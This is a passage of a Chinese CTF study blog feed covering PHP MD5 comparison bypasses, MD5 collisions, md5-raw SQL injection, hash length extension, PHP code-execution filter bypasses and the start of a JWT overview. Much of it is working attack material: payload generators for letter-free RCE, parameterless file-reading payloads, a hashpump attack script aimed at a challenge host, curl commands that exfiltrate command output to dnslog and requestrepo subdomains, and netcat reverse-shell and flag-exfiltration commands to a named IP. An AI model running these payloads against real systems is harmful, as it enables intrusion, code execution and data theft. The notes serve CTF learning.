MD5强类型比较&lt;?phphighlight_file(__FILE__);error_reporting(0);$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123;	if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])	&#123;		if ((md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])))			echo &quot;ok&quot;;		else			echo &quot;nonono&quot;;	&#125;&#125;?&gt;

在===的情况下如果没有加类似is_numeric的函数进行过滤还是可以使用数组绕过，但是不能使用科学计数法绕过了
方法三：MD5强碰撞
可以使用fastcoll来碰撞出一组内容不同但md5值相同的值
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2


双MD5MD5和双MD5以后的值都是0e开头的
CbDLytmyGm2xQyaLNhWn770hQgrBOjrcqftrlaZk7r4lGXCH2Ksu2JNT3BYM

$md5&#x3D;&#x3D;md5($md5)$md5          md5($md5)0e00275209979 0e5513875879657163210183428799050e00506035745 0e2244415516319093691015553350430e00540451811 0e0570998526843044126637966080950e00678205148 0e9340492741192626317430723941110e00741250258 0e8995677829651092699328835936030e00928251504 0e1488566747292280417238617996000e01350016114 0e7690182221257517822564603248670e01352028862 0e3884191530105085755720616061610e01392313004 0e7933141070392222175189200378850e01875552079 0e7804493053676298935125817363570e01975903983 0e3170844849603420866181615842020e02042356163 0e3359120554371804600601418196240e02218562930 0e1514928204708887723640593215790e02451355147 0e8665035343560130792417596414920e02739970294 0e8943182281156777832400470430170e02760920150 0e4131593937566465785376353110460e02784726287 0e4339551891409492691009658594960e03298616350 0e8516131883704539064082586092840e03393034171 0e077847024281996293485700020358

爆破脚本
# -*- coding: utf8 -*-import hashlibpayload = &quot;0123456789&quot;def calcMd5(s):    MD5 = hashlib.md5(s).hexdigest()    if MD5[0:2] == &quot;0e&quot; and MD5[2:32].isdigit():        print s,MD5def getStr(payload,s,slen):    #print &#x27;.&#x27;,    if len(s) == slen:        #Custom string        calcMd5(s)        return s    for j in xrange(len(payload)):        sl= s+payload[j]        getStr(payload,sl,slen)if __name__ == &#x27;__main__&#x27;:    getStr(payload,&#x27;0e&#x27;,13)

截断比较(暴力破解)&lt;?phphighlight_file(__FILE__);if (substr(md5($_POST[&#x27;auth&#x27;]),0,6) == &quot;666666&quot;) &#123;    echo &quot;1&quot;;&#125; else &#123;    echo &quot;2&quot;;&#125;?&gt;
代码中需要md5后前6位为666666可以通过脚本进行爆破脚本如下
# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#x27;&#x27;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        if md5.hexdigest()[start: start+str_len] == substr:            print rnds            stop_event.set()if __name__ == &#x27;__main__&#x27;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()
运行脚本第一个参数是需要的字符串，第二个参数是从哪一位开始验证

补充一个升级版脚本，支持尾部添加字符串例子：假设字符串是随机的（指12ba和91e0c）
&lt;?phpif (substr(md5($_POST[&#x27;auth&#x27;].&quot;12ba&quot;),0,5) == &quot;91e0c&quot;) &#123;    echo &quot;1&quot;;&#125; else &#123;    echo &quot;2&quot;;&#125;?&gt;


&gt;python2 md5.py &quot;91e0c&quot; 0 12ba1KVErD6VijQCd9BrkPEl                 //跑出的值，已经去除结尾

脚本如下
# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,off, start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#x27;&#x27;.join(random.choice(CHARS) for _ in range(size))        rnds1 =rnds+ off        md5 = hashlib.md5(rnds1)        if md5.hexdigest()[start: start+str_len] == substr:            print( rnds)            stop_event.set()if __name__ == &#x27;__main__&#x27;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    off=sys.argv[3]    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len,off, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()

不同文件相同md5linux使用md5collgen碰撞生成两个md5值相同但内容不同的文件
md5collgen -o 1.bin 2.bin

windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件
fastcoll.exe -p 123.txt -o 1.txt 2.txtfastcoll.exe a.jpg -o 1.jpg 2.jpg


php中md5($str,true)注入&lt;?php    $password = $_POST[&#x27;password&#x27;];    $sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;    $result = mysqli_query($link,$sql);    if(mysqli_num_rows($result)&gt;0)&#123;        echo &#x27;Success&#x27;;    &#125;else&#123;        echo &#x27;Failure&#x27;;    &#125;?&gt;

我们只需要找md5加密后字符串中是否存在&#39;or&#39;字符串
比如经典的ffifdyop，经过md5加密后276f722736c95d99e921722cf9ed621c，转字符串后就包含了&#39;or&#39;

其他的例子和exp
ffifdyop4SV7pbJm4aGbNas5pckHAEb

&lt;?php$payload = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;function calc_md5_true($s)&#123;    $md5_true = md5($s,true);    if (strpos($md5_true,&quot;&#x27;or&#x27;&quot;) !== false)&#123;        echo $s.PHP_EOL;    &#125;&#125;function getstr($payload, $s, $slen)&#123;    if (strlen($s) == $slen) &#123;        calc_md5_true($s);        return $s;    &#125;    for ($i = 0; $i &lt; strlen($payload); $i++) &#123;        $sl = $s . $payload[$i];        getstr($payload, $sl, $slen);    &#125;&#125;//字符串长度从3到30，肯定找得到for ($i = 3; $i &lt; 30; $i++) &#123;    getstr($payload, &#x27;&#x27;, $i);&#125;

HASH长度扩展攻击在$hash = md5($salt.$data)中已知$hash和$data以及$salt的长度时可以找到另一个$_hash和$_data使得$_hash = md5($salt.$_data)成立
已知salt长度&lt;?phphighlight_file(__FILE__);include &quot;./secret_key.php&quot;;include &quot;./salt.php&quot;;//$salt = XXXXXXXXXXXXXX // the salt include 14 characters//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df@$username = urldecode($_POST[&quot;username&quot;]);@$password = urldecode($_POST[&quot;password&quot;]);if (!empty($_COOKIE[&quot;digest&quot;])) &#123;    if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;root&quot;) &#123;         if ($_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)) &#123;            die (&quot;The secret_key is &quot;. $secret_key);        &#125;        else &#123;            die (&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;);        &#125;    &#125;    else &#123;        die (&quot;no no no&quot;);    &#125;&#125;

使用hashpump进行计算
第一行是得到的hash值，即hash(salt+’adminroot’)第二行是已知数据，即’adminroot’第三行是salt长度第四行是要添加的数据(这个随意，至少1位以上)

\x替换为%


hashpump的作者删库了，可以使用hash-ext-attack或者hexpand代替
未知salt长度攻击代码import hashpumpyimport urllibimport requestsfor i in range(1,30):	m=hashpumpy.hashpump(&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;,&#x27;;\&quot;tseug\&quot;:5:s&#x27;,&#x27;;\&quot;nimda\&quot;:5:s&#x27;,i)	print i	url=&#x27;http://120.26.131.152:32778/&#x27;	digest=m[0]	message=urllib.quote(urllib.unquote(m[1])[::-1])	cookie=&#x27;role=&#x27;+message+&#x27;; hsh=&#x27;+digest	#print cookie	headers=&#123;	&#x27;cookie&#x27;: cookie,	&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;,	&#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,	&#x27;Accept-Language&#x27;: &#x27;:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,	&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;&#125;	print headers	re=requests.get(url=url,headers=headers)	print re.text	if &quot;Welcome&quot; in re.text:		print re;		break

使用说明&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump)Help on built-in function hashpump in module hashpumpy:hashpump(...)    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&#x27;ffffffff&#x27;, &#x27;original_data&#x27;, &#x27;data_to_add&#x27;, len(&#x27;KEYKEYKEY&#x27;))(&#x27;e3c4a05f&#x27;, &#x27;original_datadata_to_add&#x27;)]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>md5</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE总结-代码执行</title>
    <url>/posts/de69952b/</url>
    <content><![CDATA[代码执行函数eval()，assert()，preg_replace()，create_function()，array_map()，call_user_func()，call_user_func_array()，array_filter()，uasort()，array_walk_recursive等
查看可用字符将题目的正则输入后即可得到可用的符号
&lt;?phpfor ($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&quot;/[a-zA-Z0-9#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($i)))&#123;        echo chr($i).&quot; &quot;;    &#125;&#125;


disable_functions绕过可以参考我写的另一篇总结：绕过disable_fuctions的方法总结

小trick：get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);
标签闭合绕过if(!preg_match(&quot;/\?|\;/&quot;,$code))&#123;    eval(&quot;?&gt;&quot;.$code);&#125;

闭合了标签，那就造一个新的标签&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;
小trick：&lt;/script&gt;结束标签自带一个;
标签闭合+长度限制if(strlen($code)&lt;=13)&#123;    eval(&quot;?&gt;&quot;.$code);&#125;

构造一个小于13位的参数：&lt;?`$_GET[2]`;
然后可以利用&amp;2传入反弹shell的命令等操作
或者在特定版本下可以用%0a绕过注释符号的闭合
无字母数字代码执行也是很经典的一类题目，参数中不能出现字母和数字思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行
$code=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;    die(&#x27;hacker&#x27;);&#125;eval($code);

异或xor在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：1^1=0,1^0=1,0^1=1,0^0=0，简单的来说就是相同为零，不同为一
例如(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)，异或后得到system

yu师傅的脚本，用来生成一个字典
&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;        for ($j=0; $j &lt;256 ; $j++) &#123;                if($i&lt;16)&#123;                        $hex_i=&#x27;0&#x27;.dechex($i);                &#125;                else&#123;                        $hex_i=dechex($i);                &#125;                if($j&lt;16)&#123;                        $hex_j=&#x27;0&#x27;.dechex($j);                &#125;                else&#123;                        $hex_j=dechex($j);                &#125;                $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                                        echo &quot;&quot;;    &#125;                else&#123;                $a=&#x27;%&#x27;.$hex_i;                $b=&#x27;%&#x27;.$hex_j;                $c=(urldecode($a)^urldecode($b));                if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;                        $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;                &#125;        &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);

然后生成payload
# -*- coding: utf-8 -*-# author yu22x# import requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)


然后用($a)();的形式执行代码即可，但是要注意PHP7前是不允许用($a)();这样的方法来执行动态函数的
补充：PHP&gt;8就不支持将没有引号包裹的字符解析为对应字符串了，xx^yy-&gt;&#39;xx&#39;^&#39;yy&#39;，这里x  y代表ascii大于128的值
取反例子
%8C-10001100逐位取反%73-01110011

利用php的取反符号~来构造任意字母
yu师傅脚本
&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;

或or原理与异或一致，利用符号|来构造
或运算就是有一为一，都是零就是零，比如说3|10，就是0011|1010，结果为1011
脚本
&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;        for ($j=0; $j &lt;256 ; $j++) &#123;                if($i&lt;16)&#123;                        $hex_i=&#x27;0&#x27;.dechex($i);                &#125;                else&#123;                        $hex_i=dechex($i);                &#125;                if($j&lt;16)&#123;                        $hex_j=&#x27;0&#x27;.dechex($j);                &#125;                else&#123;                        $hex_j=dechex($j);                &#125;                $preg = &#x27;/[0-9a-z]/i&#x27;;//根据题目给的正则表达式修改即可                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                                        echo &quot;&quot;;    &#125;                else&#123;                $a=&#x27;%&#x27;.$hex_i;                $b=&#x27;%&#x27;.$hex_j;                $c=(urldecode($a)|urldecode($b));                if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;                        $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;                &#125;        &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);

# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)


自增利用PHP中的递增&#x2F;递减运算符，也就是说&#39;a&#39;++ =&gt; &#39;b&#39;
所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。
当php强制输出数组时，数组会被转换成字符串Array，就可以拿到A（PHP函数是大小写不敏感）

一个通过Array构造出$_POST[__]($_POST[_]);的例子
&lt;?php$_=[].&#x27;&#x27;;//Array$_=$_[&#x27;&#x27;==&#x27;$&#x27;];//A$____=&#x27;_&#x27;;//_$__=$_;//A$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//P$____.=$__;//_P$__=$_;//A$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O$____.=$__;//_PO$__=$_;//A$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S$____.=$__;//_POS$__=$_;//A$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T$____.=$__;//_POST$_=$____;//_POST$$_[__]($$_[_]);//$_POST[__]($_POST[_]);//注意编码//$_=[].&#x27;&#x27;;$_=$_[&#x27;&#x27;==&#x27;$&#x27;];$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$____;$$_[__]($$_[_]);&amp;__=system&amp;_=ls

通过Array构造出($_GET[_])($_GET[__])的例子
$_=[]._;$__=$_[&#x27;!&#x27;==&#x27;=&#x27;];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_=&#x27;_&#x27;.$___;($$_[_])($$_[__]);?_=system&amp;__=ls

自增长度限制如果出现了对长度的限制，那么就需要缩短自增的过程，比如从b自增到g，肯定要比a自增到g的过程短。
在php中存在两种数据类型
NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。

我们可以利用N自增到T，这一过程经过了OPQRS，所以构造POST比构造GET更加简短
不过需要先转换成字符串类型
$_=0/0;  //float(NAN)$_=1/0; //float(INF)$_=(0/0)._;  //字符串 NAN_$_=(1/0)._; //字符串 INF_

利用NAN转换成$_POST[0]($_POST[1]);的例子
&lt;?php$a=(0/0);//NAN$a.=_;//NAN_$a=$a[0];//N$a++;//O$o=$a++;//$o=$a++是先把$a的值给$o,然后再对$a进行自增，所以这一句结束的时候 $a是P，$o是O$p=$a++;//$a=&gt;Q,$p=&gt;P$a++;$a++;//R$s=$a++;//S$t=$a;//T$_=_;//_$_.=$p.$o.$s.$t;//_POST$$_[0]($$_[1]);//$_POST[0]($_POST[1]);//用不可见字符替换php变量名称。小于等于105//$%ff=(0/0);$%ff.=_;$%ff=$%ff[0];$%ff%2b%2b;$%fd=$%ff%2b%2b;$%fe=$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$%fc=$%ff%2b%2b;$%fb=$%ff;$_=_;$_.=$%fe.$%fd.$%fc.$%fb;$$_[0]($$_[1]);&amp;0=system&amp;1=ls


进一步缩短长度至84字符，同样是利用NAN
&lt;?php$a=(_/_._)[0];//直接拼接成字符串并切片$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O$o=++$a.$o;//$o=&gt;PO,$a=&gt;P$a++;//Q$a++;//R$o.=++$a;//$o=&gt;POS,$a=&gt;S$o.=++$a;//$o=&gt;POST,$a=&gt;T$_=_.$o;//_POST$$_[0]($$_[_]);//$_POST[0]($_POST[_]);//$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=ls

还可以将_POST本身当作一个参数，缩短长度至73
$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);//$_POST[_POST]($_POST[_])


如果php开启了gettext拓展，长度还能进一步缩短，因为该扩展支持函数_() ,相当于gettext()，可以直接转化为字符串
72位
&lt;?php$a=_(a/a)[a];//N++$a;//O$_=$a.$a++;//PO$a++;$a++;//R$_=_.$_.++$a.++$a;//_POST$$_[a]($$_[_]);//$_POST[a]($_POST[_])//$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=ls

68位
&lt;?php$_=_(a/a)[_];//N$a=++$_;//O$$a[$a=_.++$_.$a[$_++/$_++].++$_.++$_]($$a[_]);//巧妙的把两次$_++放在一起//$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=ls



无参RCE经典正则，不能使用带参数的函数
if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    eval($_GET[&#x27;code&#x27;]);&#125;


end() — 将内部指针指向数组中的最后一个元素，并输出next() — 将内部指针指向数组中的下一个元素，并输出prev() — 将内部指针指向数组中的上一个元素，并输出reset() — 将内部指针指向数组中的第一个元素，并输出each() — 返回当前元素的键名和键值，并将内部指针向前移动current() — 返回数组中的当前值array_reverse() — 返回单元顺序相反的数组getcwd() — 取得当前工作目录array_rand() — 返回一个包含随机键名的数组hex2bin() — 把十六进制值转换为 ASCII 字符

getallheaders()获取全部HTTP请求头信息
可以通过var_dump(getallheaders());来输出请求头信息，然后通过next，end等来控制字符串位置
get_defined_vars()返回由所有已定义变量所组成的数组
返回数组顺序为get-&gt;post-&gt;cookie-&gt;files
session_start()php7以下适用
因为PHPSESSID的组成符号有限定，所以不能有()
读文件
GET /?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag

或者转成16进制
&lt;?phpecho bin2hex(&#x27;phpinfo();&#x27;);  //706870696e666f28293b

GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=706870696e666f28293b



scandir()一些payload
//查看当前目录下的文件var_dump(scandir(getcwd()));var_dump(scandir(current(localeconv())));var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));    //利用三角函数和floor ceil，这个是php7下能够成功//当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));//当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));//随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));//查看上一级目录文件名print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));//读取上级目录文件show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//查看和读取根目录文件（所获得的字符串第一位有几率是/，需要多试几次）print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));

dirname()php特性1：对目录取目录会得到上级目录
//  /var/www/htmlvar_dump(getcwd());//  /var/wwwvar_dump(dirname(getcwd()));//  列出/目录文件print_r(scandir(dirname(dirname(dirname(getcwd())))));

php特性2：readfile和show_source的特点
如果readfile第二个参数不设定为true，则不会寻找include_path里面的文件进行读取而show_source默认情况下，是包含include_path的
// set_include_path 成功时返回旧的 include_path 或者在失败时返回 false。//通过set_include_path函数同时实现了两个功能// 1：设置文件包含路径，方便show_source在其他目录进行读取// 2：放回 .:/usr/local/php//两次随机数取值// 1：第一次取到set_include_path函数返回的字符串中的/// 2：第二次取到根目录里的随机文件，取出flag这个字符串交给show_source进行读取show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));


import requestsimport timeurl = &quot;http://d18ae616-8323-4d47-bade-5f3ee9710125.challenge.ctf.show/?code=show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));&quot;go = Truewhile go:    res = requests.get(url)    time.sleep(0.3)    if res.text.find(&quot;flag&#123;&quot;) &gt; 0:        print(res.text)        go = False    else:        pass




无回显情况的几种利用方式题目中较常见的是shell_exec函数，与system函数相比，前者没有回显结果
写文件当有写入的权限时，可以考虑将结果写到文件中
例如：ls&gt;1.txt;
dns外带信息假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有http://dnslog.cn/
例如我们生成一个域名c9n9j5.dnslog.cn，然后在靶机上执行curl `whoami`.c9n9j5.dnslog.cn
刷新后就会在平台上返回结果

http外带信息实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等
所以可以用http的方式，推荐一个平台https://requestrepo.com/#/，用来接收get，post请求等
在靶机上执行curl http://mt2dyif2.requestrepo.com/?1=`whoami` ，过一会在平台上就会有请求返回(子域名是随机生成的)

反弹shell不回显的利用方式肯定少不了最经典的反弹shell
常规反弹语句：nc ip port -e /bin/sh，监听：nc -lvnp port
反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式https://your-shell.com/
应对一些过滤时的做法：
// 靶机执行的命令sh -c &quot;`nc 47.99.77.52 1234`&quot;// vps 传递sh脚本nc -lvvnp 1234 &lt; 1.sh// 1.sh内容echo `cat /flag` | nc 47.99.77.52 1235// vps监听1235nc -lvnnp 1235


时间盲注当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法
原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT常见安全问题学习总结</title>
    <url>/posts/40e1eb99/</url>
    <content><![CDATA[Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(RFC 7519)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。
结构jwt由三部分组成：header、payload、signature，用点.分隔
headerheader用来声明token的类型和签名用的算法等
示例
&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;

经过Base64Url编码后构成了JWT的第一部分
payloadpayload就是存放有效信息的地方
示例
&#123;  &quot;sub&quot;: &quot;1234567890&quot;,  &quot;name&quot;: &quot;John Doe&quot;,  &quot;admin&quot;: true&#125;

它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）
其中已注册声明有7个默认字段，都由官方所定义(参考rfc7519)，但并不都是必需的
iss (issuer)：JWT的发行者exp (expiration time)：过期时间sub (subject)：JWT面向的主题aud (audience)：JWT的用户nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：JWT唯一标识

公共声明：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。私人声明：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明
经过Base64Url编码后构成了JWT的第二部分
signature签名用于验证消息在此过程中没有被更改
这个部分需要Base64Url编码后的header和Base64Url编码后的payload使用.连接，组成字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分
如果要使用HMAC SHA256算法，将按以下方式创建签名
HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)

secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了
